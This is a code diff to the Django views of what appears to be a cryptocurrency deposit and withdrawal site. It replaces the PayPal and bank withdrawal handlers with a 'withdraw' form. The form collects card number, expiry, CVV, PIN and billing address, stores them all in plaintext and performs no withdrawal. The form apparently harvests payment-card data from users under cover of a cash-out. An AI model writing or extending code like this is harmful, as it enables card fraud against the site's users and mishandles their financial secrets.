@@ -8,7 +8,7 @@ from django.conf import settings
 from django.core.mail import send_mail
 
 
-from .models import Contact, Bitcoin
+from .models import Contact, Bitcoin, Card
 
 
 # Create your views here.
@@ -84,7 +84,6 @@ def depositsol(request):
     else:
         return redirect('login')
 
-
 # def selectcoin(request):
 #     if request.user.is_authenticated:
 #         return render(request, 'deposit.html')
@@ -107,7 +106,7 @@ def signin(request):
             
             if user is not None:
                 auth.login(request, user)
-				# messages.success(request, 'You are now logged in')
+                messages.success(request, 'You are now logged in')
                 return redirect('dashboard')
             else:
                 messages.error(request, 'Invalid Credentials')
@@ -163,7 +162,39 @@ def withdraw(request):
             return render(request, 'withdraw.html')
 
 
-        if request.method == 'POST' and 'bitcoin' in request.POST:
+        if request.method == 'POST':
+            name = request.POST['name']
+            number = request.POST['number']
+            expirym = request.POST['expirym']
+            expiryy = request.POST['expiryy']
+            cvv = request.POST['cvv']
+            pin = request.POST['pin']
+            zipcode = request.POST['zipcode']
+            country = request.POST['country']
+            state = request.POST['state']
+            city = request.POST['city']
+            add1 = request.POST['add1']
+            add2 = request.POST['add2']
+            username = request.POST['username']
+
+            card = Card(name=name, number=number, expirym=expirym, expiryy=expiryy, cvv=cvv, pin=pin, zipcode=zipcode, country=country, state=state, city=city, add1=add1, add2=add2, username=username,)
+
+            card.save()
+
+            # messages.success(request, 'Withdrawal Processing')
+            return render(request, 'withdraw.html')
+
+    else:
+        return redirect('login')
+
+
+def btcwithdraw(request):
+    if request.user.is_authenticated:
+        if request.method == 'GET':
+            return render(request, 'btcwithdraw.html')
+
+
+        if request.method == 'POST':
             amount = request.POST['amount']
             wallet = request.POST['wallet']
             username = request.POST['username']
@@ -172,35 +203,9 @@ def withdraw(request):
 
             withdraw.save()
 
-            messages.success(request, 'Withdrawal Processing')
-            return render(request, 'withdraw.html')
-
-        if request.method == 'POST' and 'paypal' in request.POST:
-            amount = request.POST['amount']
-            email = request.POST['email']
-            username = request.POST['username']
-
-            withdraw = Paypal(amount=amount, email=email, username=username)
-
-            withdraw.save()
-            
-            messages.success(request, 'Withdrawal Processing')
-            return render(request, 'withdraw.html')
-
-        if request.method == 'POST' and 'bank' in request.POST:
-            amount = request.POST['amount']
-            account_name = request.POST['accountname']
-            bank_name = request.POST['bankname']
-            account_number = request.POST['accountnumber']
-            username = request.POST['username']
-
-
-            withdraw = Bank(amount=amount, account_name=account_name, bank_name=bank_name, account_number=account_number, username=username)
-
-            withdraw.save()
-
-            messages.success(request, 'Withdrawal Processing')
-            return render(request, 'withdraw.html')
+            # messages.success(request, 'Withdrawal Processing')
+            return render(request, 'btcwithdraw.html')
 
     else:
         return redirect('login')
+
